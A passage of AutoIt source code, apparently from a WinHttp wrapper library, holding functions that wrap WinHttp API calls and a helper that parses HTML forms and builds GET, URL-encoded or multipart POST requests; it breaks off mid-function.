	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpReceiveResponse", "handle", $hrequest, "ptr", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpsendrequest($hrequest, $sheaders = Default, $voptional = Default, $itotallength = Default, $icontext = Default)
	__winhttpdefault($sheaders, $winhttp_no_additional_headers)
	__winhttpdefault($voptional, $winhttp_no_request_data)
	__winhttpdefault($itotallength, 0)
	__winhttpdefault($icontext, 0)
	Local $poptional = 0, $ioptionallength = 0
	If @NumParams > 2 Then
		Local $toptional
		$ioptionallength = BinaryLen($voptional)
		$toptional = DllStructCreate("byte[" & $ioptionallength & "]")
		If $ioptionallength Then $poptional = DllStructGetPtr($toptional)
		DllStructSetData($toptional, 1, $voptional)
	EndIf
	If NOT $itotallength OR $itotallength < $ioptionallength Then $itotallength += $ioptionallength
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSendRequest", "handle", $hrequest, "wstr", $sheaders, "dword", 0, "ptr", $poptional, "dword", $ioptionallength, "dword", $itotallength, "dword_ptr", $icontext)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpsetcredentials($hrequest, $iauthtargets, $iauthscheme, $susername, $spassword)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSetCredentials", "handle", $hrequest, "dword", $iauthtargets, "dword", $iauthscheme, "wstr", $susername, "wstr", $spassword, "ptr", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpsetdefaultproxyconfiguration($iaccesstype, $sproxy = "", $sproxybypass = "")
	Local $tproxy = DllStructCreate("wchar[" & StringLen($sproxy) + 1 & "]")
	DllStructSetData($tproxy, 1, $sproxy)
	Local $tproxybypass = DllStructCreate("wchar[" & StringLen($sproxybypass) + 1 & "]")
	DllStructSetData($tproxybypass, 1, $sproxybypass)
	Local $twinhttp_proxy_info = DllStructCreate("dword AccessType;" & "ptr Proxy;" & "ptr ProxyBypass")
	DllStructSetData($twinhttp_proxy_info, "AccessType", $iaccesstype)
	If $iaccesstype <> $winhttp_access_type_no_proxy Then
		DllStructSetData($twinhttp_proxy_info, "Proxy", DllStructGetPtr($tproxy))
		DllStructSetData($twinhttp_proxy_info, "ProxyBypass", DllStructGetPtr($tproxybypass))
	EndIf
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSetDefaultProxyConfiguration", "struct*", $twinhttp_proxy_info)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpsetoption($hinternet, $ioption, $vsetting, $isize = Default)
	If $isize = Default Then $isize = -1
	If IsBinary($vsetting) Then
		$isize = DllStructCreate("byte[" & BinaryLen($vsetting) & "]")
		DllStructSetData($isize, 1, $vsetting)
		$vsetting = $isize
		$isize = DllStructGetSize($vsetting)
	EndIf
	Local $stype
	Switch $ioption
		Case $winhttp_option_autologon_policy, $winhttp_option_codepage, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_connect_timeout, $winhttp_option_disable_feature, $winhttp_option_enable_feature, $winhttp_option_enabletracing, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_max_http_status_continue, $winhttp_option_max_response_drain_size, $winhttp_option_max_response_header_size, $winhttp_option_read_buffer_size, $winhttp_option_receive_timeout, $winhttp_option_receive_response_timeout, $winhttp_option_redirect_policy, $winhttp_option_reject_userpwd_in_url, $winhttp_option_request_priority, $winhttp_option_resolve_timeout, $winhttp_option_secure_protocols, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout, $winhttp_option_spn, $winhttp_option_use_global_server_credentials, $winhttp_option_worker_thread_count, $winhttp_option_write_buffer_size, $winhttp_option_decompression, $winhttp_option_unsafe_header_parsing
			$stype = "dword*"
			$isize = 4
		Case $winhttp_option_callback, $winhttp_option_passport_sign_out
			$stype = "ptr*"
			$isize = 4
			If @AutoItX64 Then $isize = 8
			If NOT IsPtr($vsetting) Then Return SetError(3, 0, 0)
		Case $winhttp_option_context_value
			$stype = "dword_ptr*"
			$isize = 4
			If @AutoItX64 Then $isize = 8
		Case $winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_user_agent, $winhttp_option_username
			$stype = "wstr"
			If (IsDllStruct($vsetting) OR IsPtr($vsetting)) Then Return SetError(3, 0, 0)
			If $isize < 1 Then $isize = StringLen($vsetting)
		Case $winhttp_option_client_cert_context, $winhttp_option_global_proxy_creds, $winhttp_option_global_server_creds, $winhttp_option_http_version, $winhttp_option_proxy
			$stype = "ptr"
			If NOT (IsDllStruct($vsetting) OR IsPtr($vsetting)) Then Return SetError(3, 0, 0)
		Case Else
			Return SetError(1, 0, 0)
	EndSwitch
	If $isize < 1 Then
		If IsDllStruct($vsetting) Then
			$isize = DllStructGetSize($vsetting)
		Else
			Return SetError(2, 0, 0)
		EndIf
	EndIf
	Local $acall
	If IsDllStruct($vsetting) Then
		$acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, DllStructGetPtr($vsetting), "dword", $isize)
	Else
		$acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, $vsetting, "dword", $isize)
	EndIf
	If @error OR NOT $acall[0] Then Return SetError(4, 0, 0)
	Return 1
EndFunc

Func _winhttpsetstatuscallback($hinternet, $hinternetcallback, $inotificationflags = Default)
	__winhttpdefault($inotificationflags, $winhttp_callback_flag_all_notifications)
	Local $acall = DllCall($hwinhttpdll__winhttp, "ptr", "WinHttpSetStatusCallback", "handle", $hinternet, "ptr", DllCallbackGetPtr($hinternetcallback), "dword", $inotificationflags, "ptr", 0)
	If @error Then Return SetError(1, 0, 0)
	Return $acall[0]
EndFunc

Func _winhttpsettimeouts($hinternet, $iresolvetimeout = Default, $iconnecttimeout = Default, $isendtimeout = Default, $ireceivetimeout = Default)
	__winhttpdefault($iresolvetimeout, 0)
	__winhttpdefault($iconnecttimeout, 60000)
	__winhttpdefault($isendtimeout, 30000)
	__winhttpdefault($ireceivetimeout, 30000)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpSetTimeouts", "handle", $hinternet, "int", $iresolvetimeout, "int", $iconnecttimeout, "int", $isendtimeout, "int", $ireceivetimeout)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpsimplebinaryconcat(ByRef $bbinary1, ByRef $bbinary2)
	Switch IsBinary($bbinary1) + 2 * IsBinary($bbinary2)
		Case 0
			Return SetError(1, 0, Binary(""))
		Case 1
			Return $bbinary1
		Case 2
			Return $bbinary2
	EndSwitch
	Local $tauxiliary = DllStructCreate("byte[" & BinaryLen($bbinary1) & "];byte[" & BinaryLen($bbinary2) & "]")
	DllStructSetData($tauxiliary, 1, $bbinary1)
	DllStructSetData($tauxiliary, 2, $bbinary2)
	Local $toutput = DllStructCreate("byte[" & DllStructGetSize($tauxiliary) & "]", DllStructGetPtr($tauxiliary))
	Return DllStructGetData($toutput, 1)
EndFunc

Func _winhttpsimpleformfill(ByRef $hinternet, $sactionpage = Default, $sformid = Default, $sfldid1 = Default, $sdta1 = Default, $sfldid2 = Default, $sdta2 = Default, $sfldid3 = Default, $sdta3 = Default, $sfldid4 = Default, $sdta4 = Default, $sfldid5 = Default, $sdta5 = Default, $sfldid6 = Default, $sdta6 = Default, $sfldid7 = Default, $sdta7 = Default, $sfldid8 = Default, $sdta8 = Default, $sfldid9 = Default, $sdta9 = Default, $sfldid10 = Default, $sdta10 = Default, $sfldid11 = Default, $sdta11 = Default, $sfldid12 = Default, $sdta12 = Default, $sfldid13 = Default, $sdta13 = Default, $sfldid14 = Default, $sdta14 = Default, $sfldid15 = Default, $sdta15 = Default, $sfldid16 = Default, $sdta16 = Default, $sfldid17 = Default, $sdta17 = Default, $sfldid18 = Default, $sdta18 = Default, $sfldid19 = Default, $sdta19 = Default, $sfldid20 = Default, $sdta20 = Default, $sfldid21 = Default, $sdta21 = Default, $sfldid22 = Default, $sdta22 = Default, $sfldid23 = Default, $sdta23 = Default, $sfldid24 = Default, $sdta24 = Default, $sfldid25 = Default, $sdta25 = Default, $sfldid26 = Default, $sdta26 = Default, $sfldid27 = Default, $sdta27 = Default, $sfldid28 = Default, $sdta28 = Default, $sfldid29 = Default, $sdta29 = Default, $sfldid30 = Default, $sdta30 = Default, $sfldid31 = Default, $sdta31 = Default, $sfldid32 = Default, $sdta32 = Default, $sfldid33 = Default, $sdta33 = Default, $sfldid34 = Default, $sdta34 = Default, $sfldid35 = Default, $sdta35 = Default, $sfldid36 = Default, $sdta36 = Default, $sfldid37 = Default, $sdta37 = Default, $sfldid38 = Default, $sdta38 = Default, $sfldid39 = Default, $sdta39 = Default, $sfldid40 = Default, $sdta40 = Default)
	__winhttpdefault($sactionpage, "")
	Local $inumargs = @NumParams, $sadditionalheaders, $scredname, $scredpass, $iignorecerterr, $iretarr
	Local $adtas[41] = [0, $sdta1, $sdta2, $sdta3, $sdta4, $sdta5, $sdta6, $sdta7, $sdta8, $sdta9, $sdta10, $sdta11, $sdta12, $sdta13, $sdta14, $sdta15, $sdta16, $sdta17, $sdta18, $sdta19, $sdta20, $sdta21, $sdta22, $sdta23, $sdta24, $sdta25, $sdta26, $sdta27, $sdta28, $sdta29, $sdta30, $sdta31, $sdta32, $sdta33, $sdta34, $sdta35, $sdta36, $sdta37, $sdta38, $sdta39, $sdta40]
	Local $aflds[41] = [0, $sfldid1, $sfldid2, $sfldid3, $sfldid4, $sfldid5, $sfldid6, $sfldid7, $sfldid8, $sfldid9, $sfldid10, $sfldid11, $sfldid12, $sfldid13, $sfldid14, $sfldid15, $sfldid16, $sfldid17, $sfldid18, $sfldid19, $sfldid20, $sfldid21, $sfldid22, $sfldid23, $sfldid24, $sfldid25, $sfldid26, $sfldid27, $sfldid28, $sfldid29, $sfldid30, $sfldid31, $sfldid32, $sfldid33, $sfldid34, $sfldid35, $sfldid36, $sfldid37, $sfldid38, $sfldid39, $sfldid40]
	If NOT Mod($inumargs, 2) Then
		$sadditionalheaders = $aflds[$inumargs / 2 - 1]
		$aflds[$inumargs / 2 - 1] = 0
		$iignorecerterr = StringInStr($sadditionalheaders, "[IGNORE_CERT_ERRORS]")
		If $iignorecerterr Then $sadditionalheaders = StringReplace($sadditionalheaders, "[IGNORE_CERT_ERRORS]", "", 1)
		$iretarr = StringInStr($sadditionalheaders, "[RETURN_ARRAY]")
		If $iretarr Then $sadditionalheaders = StringReplace($sadditionalheaders, "[RETURN_ARRAY]", "", 1)
		Local $acred = StringRegExp($sadditionalheaders, "\[CRED:(.*?)\]", 2)
		If NOT @error Then
			Local $screddelim = ":"
			If NOT StringInStr($acred[1], $screddelim) Then $screddelim = ","
			Local $astrsplit = StringSplit($acred[1], $screddelim, 3)
			If NOT @error Then
				$scredname = $astrsplit[0]
				$scredpass = $astrsplit[1]
			EndIf
			$sadditionalheaders = StringReplace($sadditionalheaders, $acred[0], "", 1)
		EndIf
	EndIf
	Local $hopen, $ahtml, $shtml, $surl, $fvarform, $ischeme = $internet_scheme_http
	If IsString($hinternet) Then
		$shtml = $hinternet
		If _winhttpqueryoption($sactionpage, $winhttp_option_handle_type) <> $winhttp_handle_type_session Then Return SetError(6, 0, "")
		$hopen = $sactionpage
		$fvarform = True
	Else
		$ischeme = _winhttpqueryoption($hinternet, $winhttp_option_context_value)
		Local $saccpt = "Accept: text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5"
		If $ischeme = $internet_scheme_https Then
			$ahtml = _winhttpsimplesslrequest($hinternet, Default, $sactionpage, Default, Default, $saccpt, 1, Default, $scredname, $scredpass, $iignorecerterr)
		ElseIf $ischeme = $internet_scheme_http Then
			$ahtml = _winhttpsimplerequest($hinternet, Default, $sactionpage, Default, Default, $saccpt, 1, Default, $scredname, $scredpass)
		Else
			$ahtml = _winhttpsimplerequest($hinternet, Default, $sactionpage, Default, Default, $saccpt, 1, Default, $scredname, $scredpass)
			If @error OR @extended >= $http_status_bad_request Then
				$ahtml = _winhttpsimplesslrequest($hinternet, Default, $sactionpage, Default, Default, $saccpt, 1, Default, $scredname, $scredpass, $iignorecerterr)
				$ischeme = $internet_scheme_https
			Else
				$ischeme = $internet_scheme_http
			EndIf
		EndIf
		If NOT @error Then
			$shtml = $ahtml[1]
			$surl = $ahtml[2]
		EndIf
	EndIf
	$shtml = StringRegExpReplace($shtml, "(?s)<!--.*?-->", "")
	$shtml = StringRegExpReplace($shtml, "(?s)<!\[CDATA\[.*?\]\]>", "")
	Local $fsend = False
	Local $aform = StringRegExp($shtml, "(?si)<\s*form(?:[^\w])\s*(.*?)(?:(?:<\s*/form\s*>)|\Z)", 3)
	If @error Then Return SetError(1, 0, "")
	Local $fgetformbyname, $sformname, $fgetformbyindex, $fgetformbyid, $iformindex
	Local $asplitform = StringSplit($sformid, ":", 2)
	If @error Then
		$fgetformbyid = True
	Else
		If $asplitform[0] = "name" Then
			$sformname = $asplitform[1]
			$fgetformbyname = True
		ElseIf $asplitform[0] = "index" Then
			$iformindex = Number($asplitform[1])
			$fgetformbyindex = True
		ElseIf $asplitform[0] = "id" Then
			$sformid = $asplitform[1]
			$fgetformbyid = True
		Else
			$sformid = $asplitform[0]
			$fgetformbyid = True
		EndIf
	EndIf
	Local $sform, $sattributes, $ainput
	Local $inumparams = Ceiling(($inumargs - 2) / 2) - 1
	Local $sadddata, $snewurl
	For $iformordinal = 0 To UBound($aform) - 1
		If $fgetformbyindex AND $iformordinal <> $iformindex Then ContinueLoop
		$sform = $aform[$iformordinal]
		$sattributes = StringRegExp($sform, "(?s)(.*?)>", 3)
		If NOT @error Then $sattributes = StringRegExpReplace($sattributes[0], "\v", " ")
		Local $saction = "", $saccept = "", $senctype = "", $smethod = "", $sname = "", $sid = ""
		$sid = __winhttpattribval($sattributes, "id")
		If $fgetformbyid AND $sformid <> Default AND $sid <> $sformid Then ContinueLoop
		$sname = __winhttpattribval($sattributes, "name")
		If $fgetformbyname AND $sformname <> $sname Then ContinueLoop
		$saction = __winhttphtmldecode(__winhttpattribval($sattributes, "action"))
		$saccept = __winhttpattribval($sattributes, "accept")
		$senctype = __winhttpattribval($sattributes, "enctype")
		$smethod = __winhttpattribval($sattributes, "method")
		$fsend = True
		Local $sspr1 = Chr(27), $sspr2 = Chr(26)
		__winhttpnormalizeform($sform, $sspr1, $sspr2)
		$ainput = StringRegExp($sform, "(?si)<\h*(?:input|textarea|label|fieldset|legend|select|optgroup|option|button)\h*(.*?)/*\h*>", 3)
		If @error Then Return SetError(2, 0, "")
		__winhttphtml5formattribs($adtas, $aflds, $inumparams, $ainput, $saction, $senctype, $smethod)
		__winhttpnormalizeactionurl($sactionpage, $saction, $ischeme, $snewurl, $senctype, $smethod, $surl)
		If $fvarform AND NOT $snewurl Then Return SetError(5, 0, "")
		Local $asplit, $sboundary, $spassedid, $spasseddata, $inumrepl, $fmultipart = False, $ssubmit, $sradio, $scheckbox, $sbutton
		Local $sgrsep = Chr(29), $ierr
		Local $ainputids[4][UBound($ainput)]
		Switch $senctype
			Case "", "application/x-www-form-urlencoded", "text/plain"
				For $i = 0 To UBound($ainput) - 1
					__winhttpformattrib($ainputids, $i, $ainput[$i])
					If $ainputids[1][$i] Then
						$ainputids[1][$i] = __winhttpurlencode(StringReplace($ainputids[1][$i], $sspr1, " "), $senctype)
						$ainputids[2][$i] = __winhttpurlencode(StringReplace(StringReplace($ainputids[2][$i], $sspr2, ">"), $sspr1, " "), $senctype)
						$sadddata &= $ainputids[1][$i] & "=" & $ainputids[2][$i] & "&"
						If $ainputids[3][$i] = "submit" Then $ssubmit &= $ainputids[1][$i] & "=" & $ainputids[2][$i] & $sgrsep
						If $ainputids[3][$i] = "radio" Then $sradio &= $ainputids[1][$i] & "=" & $ainputids[2][$i] & $sgrsep
						If $ainputids[3][$i] = "checkbox" Then $scheckbox &= $ainputids[1][$i] & "=" & $ainputids[2][$i] & $sgrsep
						If $ainputids[3][$i] = "button" Then $sbutton &= $ainputids[1][$i] & "=" & $ainputids[2][$i] & $sgrsep
					EndIf
				Next
				$ssubmit = StringTrimRight($ssubmit, 1)
				$sradio = StringTrimRight($sradio, 1)
				$scheckbox = StringTrimRight($scheckbox, 1)
				$sbutton = StringTrimRight($sbutton, 1)
				$sadddata = StringTrimRight($sadddata, 1)
				For $k = 1 To $inumparams
					$spasseddata = __winhttpurlencode($adtas[$k], $senctype)
					$adtas[$k] = 0
					$spassedid = $aflds[$k]
					$aflds[$k] = 0
					$asplit = StringSplit($spassedid, ":", 2)
					$ierr = @error
					$asplit[0] = __winhttpurlencode($asplit[0], $senctype)
					If NOT $ierr Then $asplit[1] = __winhttpurlencode($asplit[1], $senctype)
					If $ierr OR $asplit[0] <> "name" Then
						If NOT $ierr AND $asplit[0] = "id" Then $spassedid = $asplit[1]
						For $j = 0 To UBound($ainputids, 2) - 1
							If $ainputids[0][$j] = $spassedid Then
								If $ainputids[3][$j] = "submit" Then
									If $spasseddata = True Then
										If $ssubmit Then
											Local $fdelid = False
											For $schunksub In StringSplit($ssubmit, $sgrsep, 3)
												If $schunksub == $ainputids[1][$j] & "=" & $ainputids[2][$j] Then
													If $fdelid Then $sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $schunksub & "\E(?:&|\Z)", "&", 1)
													$fdelid = True
												Else
													$sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $schunksub & "\E(?:&|\Z)", "&")
												EndIf
												__winhttptrimbounds($sadddata, "&")
											Next
											$ssubmit = ""
										EndIf
									EndIf
								ElseIf $ainputids[3][$j] = "radio" Then
									If $spasseddata = $ainputids[2][$j] Then
										For $schunksub In StringSplit($sradio, $sgrsep, 3)
											If $schunksub == $ainputids[1][$j] & "=" & $spasseddata Then
												$sadddata = StringRegExpReplace(StringReplace($sadddata, "&", "&&"), "(?:&|\A)\Q" & $ainputids[1][$j] & "\E(.*?)(?:&|\Z)", "&")
												$sadddata = StringReplace(StringReplace($sadddata, "&&", "&"), "&&", "&")
												If StringLeft($sadddata, 1) = "&" Then $sadddata = StringTrimLeft($sadddata, 1)
												$sadddata &= "&" & $schunksub
												$sradio = StringRegExpReplace(StringReplace($sradio, $sgrsep, $sgrsep & $sgrsep), "(?:" & $sgrsep & "|\A)\Q" & $ainputids[1][$j] & "\E(.*?)(?:" & $sgrsep & "|\Z)", $sgrsep)
												$sradio = StringReplace(StringReplace($sradio, $sgrsep & $sgrsep, $sgrsep), $sgrsep & $sgrsep, $sgrsep)
											EndIf
										Next
									EndIf
								ElseIf $ainputids[3][$j] = "checkbox" Then
									$scheckbox = StringRegExpReplace($scheckbox, "\Q" & $ainputids[1][$j] & "=" & $spasseddata & "\E" & $sgrsep & "*", "")
									__winhttptrimbounds($scheckbox, $sgrsep)
								ElseIf $ainputids[3][$j] = "button" Then
									$sbutton = StringRegExpReplace($sbutton, "\Q" & $ainputids[1][$j] & "=" & $spasseddata & "\E" & $sgrsep & "*", "")
									__winhttptrimbounds($sbutton, $sgrsep)
								Else
									$sadddata = StringRegExpReplace(StringReplace($sadddata, "&", "&&"), "(?:&|\A)\Q" & $ainputids[1][$j] & "=" & $ainputids[2][$j] & "\E(?:&|\Z)", "&" & $ainputids[1][$j] & "=" & $spasseddata & "&")
									$inumrepl = @extended
									$sadddata = StringReplace($sadddata, "&&", "&")
									If $inumrepl > 1 Then
										$sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $ainputids[1][$j] & "\E=.*?(?:&|\Z)", "&", $inumrepl - 1)
									EndIf
									__winhttptrimbounds($sadddata, "&")
								EndIf
							EndIf
						Next
					Else
						For $j = 0 To UBound($ainputids, 2) - 1
							If $ainputids[3][$j] = "submit" Then
								If $spasseddata = True Then
									If $ainputids[1][$j] == $asplit[1] Then
										If $ssubmit Then
											Local $fdel = False
											For $schunksub In StringSplit($ssubmit, $sgrsep, 3)
												If $schunksub = $ainputids[1][$j] & "=" & $ainputids[2][$j] Then
													If $fdel Then $sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $schunksub & "\E(?:&|\Z)", "&", 1)
													$fdel = True
												Else
													$sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $schunksub & "\E(?:&|\Z)", "&")
												EndIf
												__winhttptrimbounds($sadddata, "&")
											Next
											$ssubmit = ""
										EndIf
										ContinueLoop 2
									EndIf
								Else
									ContinueLoop 2
								EndIf
							ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "radio" Then
								For $schunksub In StringSplit($sradio, $sgrsep, 3)
									If $schunksub == $ainputids[1][$j] & "=" & $spasseddata Then
										$sadddata = StringReplace(StringReplace(StringRegExpReplace(StringReplace($sadddata, "&", "&&"), "(?:&|\A)\Q" & $ainputids[1][$j] & "\E(.*?)(?:&|\Z)", "&"), "&&", "&"), "&&", "&")
										If StringLeft($sadddata, 1) = "&" Then $sadddata = StringTrimLeft($sadddata, 1)
										$sadddata &= "&" & $schunksub
										$sradio = StringRegExpReplace(StringReplace($sradio, $sgrsep, $sgrsep & $sgrsep), "(?:" & $sgrsep & "|\A)\Q" & $ainputids[1][$j] & "\E(.*?)(?:" & $sgrsep & "|\Z)", $sgrsep)
										$sradio = StringReplace(StringReplace($sradio, $sgrsep & $sgrsep, $sgrsep), $sgrsep & $sgrsep, $sgrsep)
									EndIf
								Next
								ContinueLoop 2
							ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "checkbox" Then
								$scheckbox = StringRegExpReplace($scheckbox, "\Q" & $ainputids[1][$j] & "=" & $spasseddata & "\E" & $sgrsep & "*", "")
								__winhttptrimbounds($scheckbox, $sgrsep)
								ContinueLoop 2
							ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "button" Then
								$sbutton = StringRegExpReplace($sbutton, "\Q" & $ainputids[1][$j] & "=" & $spasseddata & "\E" & $sgrsep & "*", "")
								__winhttptrimbounds($sbutton, $sgrsep)
								ContinueLoop 2
							EndIf
						Next
						$sadddata = StringRegExpReplace(StringReplace($sadddata, "&", "&&"), "(?:&|\A)\Q" & $asplit[1] & "\E=.*?(?:&|\Z)", "&" & $asplit[1] & "=" & $spasseddata & "&")
						$inumrepl = @extended
						$sadddata = StringReplace($sadddata, "&&", "&")
						If $inumrepl > 1 Then
							$sadddata = StringRegExpReplace($sadddata, "(?:&|\A)\Q" & $asplit[1] & "\E=.*?(?:&|\Z)", "&", $inumrepl - 1)
						EndIf
						__winhttptrimbounds($sadddata, "&")
					EndIf
				Next
				__winhttpfinalizectrls($ssubmit, $sradio, $scheckbox, $sbutton, $sadddata, $sgrsep, "&")
				If $smethod = "GET" Then
					$saction &= "?" & $sadddata
					$sadddata = ""
				EndIf
			Case "multipart/form-data"
				If $smethod = "POST" Then
					$fmultipart = True
					$sboundary = StringFormat("%s%.5f", "----WinHttpBoundaryLine_", Random(10000, 99999))
					Local $scdisp = 'Content-Disposition: form-data; name="'
					For $i = 0 To UBound($ainput) - 1
						__winhttpformattrib($ainputids, $i, $ainput[$i])
						If $ainputids[1][$i] Then
							$ainputids[1][$i] = StringReplace($ainputids[1][$i], $sspr1, " ")
							$ainputids[2][$i] = StringReplace(StringReplace($ainputids[2][$i], $sspr2, ">"), $sspr1, " ")
							If $ainputids[3][$i] = "file" Then
								$sadddata &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"; filename=""' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF
							Else
								$sadddata &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF
							EndIf
							If $ainputids[3][$i] = "submit" Then $ssubmit &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF & $sgrsep
							If $ainputids[3][$i] = "radio" Then $sradio &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF & $sgrsep
							If $ainputids[3][$i] = "checkbox" Then $scheckbox &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF & $sgrsep
							If $ainputids[3][$i] = "button" Then $sbutton &= "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$i] & '"' & @CRLF & @CRLF & $ainputids[2][$i] & @CRLF & $sgrsep
						EndIf
					Next
					$ssubmit = StringTrimRight($ssubmit, 1)
					$sradio = StringTrimRight($sradio, 1)
					$scheckbox = StringTrimRight($scheckbox, 1)
					$sbutton = StringTrimRight($sbutton, 1)
					$sadddata &= "--" & $sboundary & "--" & @CRLF
					For $k = 1 To $inumparams
						$spasseddata = $adtas[$k]
						$adtas[$k] = 0
						$spassedid = $aflds[$k]
						$aflds[$k] = 0
						$asplit = StringSplit($spassedid, ":", 2)
						If @error OR $asplit[0] <> "name" Then
							If NOT @error AND $asplit[0] = "id" Then $spassedid = $asplit[1]
							For $j = 0 To UBound($ainputids, 2) - 1
								If $ainputids[0][$j] = $spassedid Then
									If $ainputids[3][$j] = "file" Then
										$sadddata = StringReplace($sadddata, $scdisp & $ainputids[1][$j] & '"; filename=""' & @CRLF & @CRLF & $ainputids[2][$j] & @CRLF, __winhttpfilecontent($saccept, $ainputids[1][$j], $spasseddata, $sboundary), 0, 1)
									ElseIf $ainputids[3][$j] = "submit" Then
										If $spasseddata = True Then
											If $ssubmit Then
												Local $fmdelid = False
												For $schunksub In StringSplit($ssubmit, $sgrsep, 3)
													If $schunksub = "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $ainputids[2][$j] & @CRLF Then
														If $fmdelid Then $sadddata = StringReplace($sadddata, $schunksub, "", 1, 1)
														$fmdelid = True
													Else
														$sadddata = StringReplace($sadddata, $schunksub, "", 0, 1)
													EndIf
												Next
												$ssubmit = ""
											EndIf
										EndIf
									ElseIf $ainputids[3][$j] = "radio" Then
										If $spasseddata = $ainputids[2][$j] Then
											For $schunksub In StringSplit($sradio, $sgrsep, 3)
												If StringInStr($schunksub, "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF, 1) Then
													$sadddata = StringRegExpReplace($sadddata, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & "\E" & "(.*?)" & @CRLF, "")
													$sadddata = StringReplace($sadddata, "--" & $sboundary & "--" & @CRLF, "", 0, 1)
													$sadddata &= $schunksub & "--" & $sboundary & "--" & @CRLF
													$sradio = StringRegExpReplace($sradio, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & "\E(.*?)" & @CRLF & $sgrsep & "?", "")
												EndIf
											Next
										EndIf
									ElseIf $ainputids[3][$j] = "checkbox" Then
										$scheckbox = StringRegExpReplace($scheckbox, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF & "\E" & $sgrsep & "*", "")
										If StringRight($scheckbox, 1) = $sgrsep Then $scheckbox = StringTrimRight($scheckbox, 1)
									ElseIf $ainputids[3][$j] = "button" Then
										$sbutton = StringRegExpReplace($sbutton, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF & "\E" & $sgrsep & "*", "")
										If StringRight($sbutton, 1) = $sgrsep Then $sbutton = StringTrimRight($sbutton, 1)
									Else
										$sadddata = StringReplace($sadddata, $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $ainputids[2][$j] & @CRLF, $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF, 0, 1)
										$inumrepl = @extended
										If $inumrepl > 1 Then
											$sadddata = StringRegExpReplace($sadddata, "(?s)\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & "\E\r\n\r\n.*?\r\n", "", $inumrepl - 1)
										EndIf
									EndIf
								EndIf
							Next
						Else
							For $j = 0 To UBound($ainputids, 2) - 1
								If $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "file" Then
									$sadddata = StringReplace($sadddata, $scdisp & $asplit[1] & '"; filename=""' & @CRLF & @CRLF & $ainputids[2][$j] & @CRLF, __winhttpfilecontent($saccept, $ainputids[1][$j], $spasseddata, $sboundary), 0, 1)
								ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "submit" Then
									If $spasseddata = True Then
										If $ssubmit Then
											Local $fmdel = False
											For $schunksub In StringSplit($ssubmit, $sgrsep, 3)
												If $schunksub = "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $ainputids[2][$j] & @CRLF Then
													If $fmdel Then $sadddata = StringReplace($sadddata, $schunksub, "", 1, 1)
													$fmdel = True
												Else
													$sadddata = StringReplace($sadddata, $schunksub, "", 0, 1)
												EndIf
											Next
											$ssubmit = ""
										EndIf
										ContinueLoop 2
									Else
										ContinueLoop 2
									EndIf
								ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "radio" Then
									For $schunksub In StringSplit($sradio, $sgrsep, 3)
